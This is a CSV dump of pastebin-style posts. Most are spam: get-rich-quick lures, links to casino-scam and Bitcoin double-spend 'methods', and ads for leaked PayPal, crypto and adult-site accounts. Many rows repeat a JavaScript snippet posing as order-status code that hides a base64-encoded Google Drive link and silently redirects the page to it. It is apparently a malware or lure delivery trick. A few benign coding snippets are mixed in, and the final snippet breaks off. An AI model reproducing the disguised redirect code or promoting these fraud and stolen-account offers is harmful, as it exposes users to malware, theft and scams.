id,title,username,language,date,content
Siv8FRXp,Make $1000 15-MINUTES (BEGINNER) L4,incognito___,JavaScript,Saturday 3rd of May 2025 12:57:40 PM CDT," 
Pdf https://tinyurl.com/freshleaks

cJrlTzYnUR
"
i6xFKFL0,Scam Casinos and Stores,WantingTrae,JavaScript,Saturday 3rd of May 2025 12:53:48 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 47637
PQ521pqt,Order.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 12:53:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47287/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TAZ3zqq1,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 12:53:33 PM CDT,07210 Accounts Posted On https://t.me/leakzbyeminem
g4qaxypi,EARN $900 INSTANTLY 2025⭐ GV,incognito___,JavaScript,Saturday 3rd of May 2025 12:48:25 PM CDT," 
Pdf https://tinyurl.com/freshleaks

u0Wh3XOVr7
"
wnvSgrZk,Templete,Promit_990,C++,Saturday 3rd of May 2025 12:42:54 PM CDT,"#include<bits/stdc++.h>
using namespace std;
#define promit() ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0);
#define foro(n) for(int i=0;i<int(n);i++)
#define D double
#define ll long long int
#define endl '\n'

const int mod=(int) 1000000007;
const int mx=200005;
int arr[mx];
int ans[mx];

bool isPrime(ll n){
    if(n==2) return true;
    if(n%2==0 || n<2) return false;
    for(int i=3;i*i<=n;i+=2){
        if(n%i==0) return false;
    }
    return true;
}


void solve(){
    
}

int main(){

//    #ifndef ONLINE_JUDGE
//    freopen(""input.txt"",""r"",stdin);
//    freopen(""output.txt"",""w"",stdout);
//   #endif
    ll t=1;
    cin>>t;
    while(t--){
        solve();
    }
    return 0;
}
"
30DdQJ4Q,Make $1000 15-MINUTES  (BEGINNER) YR,incognito___,JavaScript,Saturday 3rd of May 2025 12:39:11 PM CDT," 
Pdf https://tinyurl.com/freshleaks

MirdlTUZP6
"
YPVhYWqn,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Saturday 3rd of May 2025 12:38:27 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 87402
UzetmQ5m,Market.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 12:38:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01613/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
t48dkBeY,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 12:38:11 PM CDT,95440 Accounts Posted On https://t.me/leakzbyeminem
4Kj1V7iU,EARN $900 INSTANTLY 2025 95,incognito___,JavaScript,Saturday 3rd of May 2025 12:29:57 PM CDT," 
Pdf https://tinyurl.com/freshleaks

P4zRGDvBNA
"
kCVESfYY,Movement Pattern Shmup Enemy,SilverTES,C#,Saturday 3rd of May 2025 12:27:03 PM CDT,"using Microsoft.Xna.Framework;
using System;
using System.Collections.Generic;

namespace ShootThemAll
{
    public enum CurveType
    {
        Linear,
        Bezier,
        Sinusoidal,
        Custom,
    }
    public class MovePattern
    {
        public List<Vector2> Waypoints { get; set; }
        public float Speed { get; set; }
        public bool Loop { get; set; }
        public CurveType CurveType { get; set; }
        public Func<float, Vector2> CustomTrajectory { get; set; } // Fonction personnalisée

        public Vector2 CalculatePosition(float progress)
        {
            switch (CurveType)
            {
                case CurveType.Linear:
                    return LinearInterpolation(progress);
                case CurveType.Bezier:
                    return BezierInterpolation(progress);
                case CurveType.Sinusoidal:
                    return SinusoidalMovement(progress);
                default:
                    return Waypoints[0]; // Fallback
            }
        }
        private Vector2 LinearInterpolation(float progress)
        {
            int startIndex = (int)(progress * (Waypoints.Count - 1));
            int endIndex = Math.Min(startIndex + 1, Waypoints.Count - 1);
            float segmentProgress = (progress * (Waypoints.Count - 1)) % 1;

            return Vector2.Lerp(Waypoints[startIndex], Waypoints[endIndex], segmentProgress);
        }

        private Vector2 BezierInterpolation(float progress)
        {
            if (Waypoints.Count < 2)
                return Vector2.Zero; // Pas assez de points pour une courbe

            // Normaliser le progrès entre 0 et 1
            float t = Math.Clamp(progress, 0f, 1f);
            int n = Waypoints.Count - 1; // Ordre de la courbe

            Vector2 result = Vector2.Zero;
            for (int i = 0; i <= n; i++)
            {
                // Calculer le coefficient binomial et le terme de la formule de Bézier
                float coefficient = BinomialCoefficient(n, i) * (float)Math.Pow(1 - t, n - i) * (float)Math.Pow(t, i);
                result += coefficient * Waypoints[i];
            }

            return result;
        }

        private static float BinomialCoefficient(int n, int k)
        {
            if (k < 0 || k > n) return 0;
            if (k == 0 || k == n) return 1;

            // Optimisation : utiliser la symétrie pour réduire les calculs
            k = Math.Min(k, n - k);
            float result = 1;
            for (int i = 1; i <= k; i++)
            {
                result *= (n - (k - i)) / (float)i;
            }
            return result;
        }


        private Vector2 SinusoidalMovement(float progress)
        {
            // Exemple : mouvement sinusoïdal autour d'un axe
            Vector2 basePos = LinearInterpolation(progress);
            float amplitude = 50f; // Paramétrable
            float frequency = 2f; // Paramétrable
            basePos.Y += (float)Math.Sin(progress * frequency * Math.PI) * amplitude;
            return basePos;
        }


    }
    //public class Wave
    //{
    //    private List<(float spawnTime, Enemy enemy)> _enemies = new();
    //    private float _timer;

    //    public void AddEnemy(float spawnTime, Enemy enemy)
    //    {
    //        _enemies.Add((spawnTime, enemy));
    //    }

    //    public void Update(GameTime gameTime, List<Enemy> activeEnemies)
    //    {
    //        _timer += (float)gameTime.ElapsedGameTime.TotalSeconds;

    //        foreach (var (spawnTime, enemy) in _enemies)
    //        {
    //            if (_timer >= spawnTime && !activeEnemies.Contains(enemy))
    //            {
    //                activeEnemies.Add(enemy);
    //            }
    //        }

    //        foreach (var enemy in activeEnemies)
    //        {
    //            enemy.Update(gameTime);
    //        }
    //    }
    //}

}
"
VugywiPj,VPN PING,Michael_ich,JSON,Saturday 3rd of May 2025 12:23:14 PM CDT,"[
    {
        ""id"": ""send_off_msg"",
        ""type"": ""function"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Send offline message"",
        ""func"": ""msg.payload = {chatId: АйДи, type: 'message', content: 'На даче нет интернета'};\nreturn msg;"",
        ""outputs"": 1,
        ""timeout"": """",
        ""noerr"": 1,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 820,
        ""y"": 620,
        ""wires"": [
            [
                ""telegram_send""
            ]
        ]
    },
    {
        ""id"": ""send_on_msg"",
        ""type"": ""function"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Send online message"",
        ""func"": ""msg.payload = {chatId: АйДи, type: 'message', content: 'На даче появился интернет'};\nreturn msg;"",
        ""outputs"": 1,
        ""timeout"": """",
        ""noerr"": 1,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 820,
        ""y"": 680,
        ""wires"": [
            [
                ""telegram_send""
            ]
        ]
    },
    {
        ""id"": ""4d32c92d13298bfa"",
        ""type"": ""server-state-changed"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Ping state change"",
        ""server"": ""9255c353.0ab86"",
        ""version"": 5,
        ""outputs"": 1,
        ""exposeAsEntityConfig"": """",
        ""entityId"": ""binary_sensor.192_168_2_10"",
        ""entityIdType"": ""exact"",
        ""outputInitially"": false,
        ""stateType"": ""str"",
        ""ifState"": """",
        ""ifStateType"": ""str"",
        ""ifStateOperator"": ""is"",
        ""outputOnlyOnStateChange"": true,
        ""for"": """",
        ""forType"": ""num"",
        ""forUnits"": ""minutes"",
        ""ignorePrevStateNull"": false,
        ""ignorePrevStateUnknown"": false,
        ""ignorePrevStateUnavailable"": false,
        ""ignoreCurrentStateUnknown"": false,
        ""ignoreCurrentStateUnavailable"": false,
        ""outputProperties"": [
            {
                ""property"": ""payload"",
                ""propertyType"": ""msg"",
                ""value"": """",
                ""valueType"": ""entityState""
            },
            {
                ""property"": ""data"",
                ""propertyType"": ""msg"",
                ""value"": """",
                ""valueType"": ""eventData""
            },
            {
                ""property"": ""topic"",
                ""propertyType"": ""msg"",
                ""value"": """",
                ""valueType"": ""triggerId""
            }
        ],
        ""x"": 130,
        ""y"": 640,
        ""wires"": [
            [
                ""state_switch""
            ]
        ]
    },
    {
        ""id"": ""state_switch"",
        ""type"": ""switch"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""On / Off?"",
        ""property"": ""payload"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""off"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""on"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 2,
        ""x"": 330,
        ""y"": 640,
        ""wires"": [
            [
                ""off_trigger""
            ],
            [
                ""cb7c6fd8bff030b0"",
                ""e112e5210755c8d7""
            ]
        ]
    },
    {
        ""id"": ""set_offline_flag"",
        ""type"": ""change"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""flow.wasOffline = true"",
        ""rules"": [
            {
                ""t"": ""set"",
                ""p"": ""wasOffline"",
                ""pt"": ""flow"",
                ""to"": ""true"",
                ""tot"": ""bool""
            }
        ],
        ""x"": 820,
        ""y"": 580,
        ""wires"": [
            []
        ]
    },
    {
        ""id"": ""off_trigger"",
        ""type"": ""trigger"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Wait 15s (confirm offline)"",
        ""op1"": """",
        ""op2"": ""offline"",
        ""op1type"": ""nul"",
        ""op2type"": ""str"",
        ""duration"": ""15"",
        ""extend"": false,
        ""overrideDelay"": false,
        ""units"": ""s"",
        ""reset"": ""on"",
        ""bytopic"": ""all"",
        ""topic"": ""topic"",
        ""outputs"": 1,
        ""x"": 560,
        ""y"": 600,
        ""wires"": [
            [
                ""set_offline_flag"",
                ""send_off_msg""
            ]
        ]
    },
    {
        ""id"": ""clear_offline_flag"",
        ""type"": ""change"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""flow.wasOffline = false"",
        ""rules"": [
            {
                ""t"": ""set"",
                ""p"": ""wasOffline"",
                ""pt"": ""flow"",
                ""to"": ""false"",
                ""tot"": ""bool""
            }
        ],
        ""x"": 820,
        ""y"": 720,
        ""wires"": [
            []
        ]
    },
    {
        ""id"": ""cb7c6fd8bff030b0"",
        ""type"": ""change"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": """",
        ""rules"": [
            {
                ""t"": ""set"",
                ""p"": ""reset"",
                ""pt"": ""msg"",
                ""to"": ""1"",
                ""tot"": ""num""
            }
        ],
        ""action"": """",
        ""property"": """",
        ""from"": """",
        ""to"": """",
        ""reg"": false,
        ""x"": 580,
        ""y"": 660,
        ""wires"": [
            [
                ""off_trigger""
            ]
        ]
    },
    {
        ""id"": ""e112e5210755c8d7"",
        ""type"": ""function"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Проверка Was offline?"",
        ""func"": ""if (flow.get(\""wasOffline\"") === true || flow.get(\""wasOffline\"") === undefined) {\n    return [msg, null];\n}\nreturn [null, msg];"",
        ""outputs"": 2,
        ""timeout"": """",
        ""noerr"": 0,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 580,
        ""y"": 720,
        ""wires"": [
            [
                ""send_on_msg"",
                ""clear_offline_flag""
            ],
            []
        ]
    },
    {
        ""id"": ""telegram_send"",
        ""type"": ""telegram sender"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": """",
        ""bot"": ""fb3719f3.7be288"",
        ""haserroroutput"": false,
        ""outputs"": 1,
        ""x"": 1070,
        ""y"": 660,
        ""wires"": [
            []
        ]
    }
]"
jfsEWu5z,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Saturday 3rd of May 2025 12:22:57 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 76440
jSpez8jN,Untitled,SpawnKz,JavaScript,Saturday 3rd of May 2025 12:22:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55834/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DciAq73G,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 12:22:49 PM CDT,22338 Accounts Posted On https://t.me/leakzbyeminem
cKHW59pY,Make $1000 15-MINUTES (BEGINNER) L4,incognito___,JavaScript,Saturday 3rd of May 2025 12:20:43 PM CDT," 
Pdf https://tinyurl.com/freshleaks

bAgPZ1msZ0
"
KY4Jz3b6,EARN $900 INSTANTLY 2025⭐ GV,incognito___,JavaScript,Saturday 3rd of May 2025 12:11:29 PM CDT," 
Pdf https://tinyurl.com/freshleaks

EPUxvwrH7Z
"
tCS1RXXp,Stake Free Balance Method,WantingTrae,JavaScript,Saturday 3rd of May 2025 12:07:36 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 95307
5UKHbS4j,Products.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 12:07:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26164/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
neJpiXjf,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 12:07:28 PM CDT,19254 Accounts Posted On https://t.me/leakzbyeminem
URHjg8jn,Scam Casinos and Stores,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:52:13 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 17540
1TrsNX4A,Order.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:52:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42094/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G4ixAm1C,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:52:06 AM CDT,99138 Accounts Posted On https://t.me/leakzbyeminem
AdMSdScJ,Code Entry Manager,MatiGe,C#,Saturday 3rd of May 2025 11:40:47 AM CDT,"using UnityEngine;
using UnityEngine.UI;
using TMPro;
using UnityEngine.SceneManagement;

public class CodeEntryManager : MonoBehaviour
{
    public InputField codeInputField;
    public Button submitButton;
    public string correctCode = ""TESTCODE""; // **Important: Replace with a temporary test code**
    public string nextSceneName = ""GameScene""; // Assuming your game scene is named ""GameScene""

    void Start()
    {
        if (codeInputField == null || submitButton == null)
        {
            Debug.LogError(""One or more UI elements are not assigned in the Inspector!"");
            enabled = false;
            return;
        }

        submitButton.onClick.AddListener(CheckCode);
    }

    void CheckCode()
    {
        if (codeInputField.text == correctCode)
        {
            Invoke(""LoadNextScene"", 1f);
        }
        else
        {
            codeInputField.text = """";
        }
    }

    void LoadNextScene()
    {
        SceneManager.LoadScene(nextSceneName);
    }
}"
uA07xy0b,index,MatiGe,HTML,Saturday 3rd of May 2025 11:37:00 AM CDT,"<!DOCTYPE html>
<html>

<head>
    <title>Code Generator</title>
    <style>
        body {
            font-family: sans-serif;
            text-align: center;
        }

        #generatedCode {
            font-size: 2em;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <h1>Your Secret Code</h1>
    <div id=""generatedCode""></div>
    <button onclick=""generateCode()"">Generate New Code</button>

    <script>
        function generateCode() {
            const length = 8;
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let code = '';
            for (let i = 0; i < length; i++) {
                code += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            document.getElementById('generatedCode').innerText = code;
            // You might want to store this code somewhere if you need server-side verification
            console.log(""Generated Code:"", code);
        }

        // Generate an initial code when the page loads
        generateCode();
    </script>
</body>

</html>"
eds7bBSX,Market.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:36:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05658/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z9MgaksX,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:36:50 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 94155
6jg5kKir,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:36:44 AM CDT,53867 Accounts Posted On https://t.me/leakzbyeminem
RM9FRCDh,Untitled,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:21:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11497/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DPAr5Uq3,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:21:27 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 39318
FJ4jn1W9,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:21:22 AM CDT,86155 Accounts Posted On https://t.me/leakzbyeminem
Du8ShK9e,Products.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:06:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27294/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kDP1CqM4,Stake Free Balance Method,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:06:05 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 03291
hmQWDPXb,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:06:01 AM CDT,68955 Accounts Posted On https://t.me/leakzbyeminem
ckUPY69v,Scam Casinos and Stores,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:50:45 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 10434
GCTitTcP,Order.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 10:50:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
82sATZdd,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 10:50:39 AM CDT,87059 Accounts Posted On https://t.me/leakzbyeminem
zTEn9Shh,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:35:22 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 18331
yBXacYQy,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 10:35:17 AM CDT,73297 Accounts Posted On https://t.me/leakzbyeminem
FeJabTJz,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:19:58 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 54830
HuCmbwVu,Untitled,SpawnKz,JavaScript,Saturday 3rd of May 2025 10:19:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65006/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
v7vxkB8y,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 10:19:55 AM CDT,44626 Accounts Posted On https://t.me/leakzbyeminem
XvpRqzdy,Stake Free Balance Method,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:04:36 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 65137
xX5KmPKd,Untitled,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:04:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13779/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
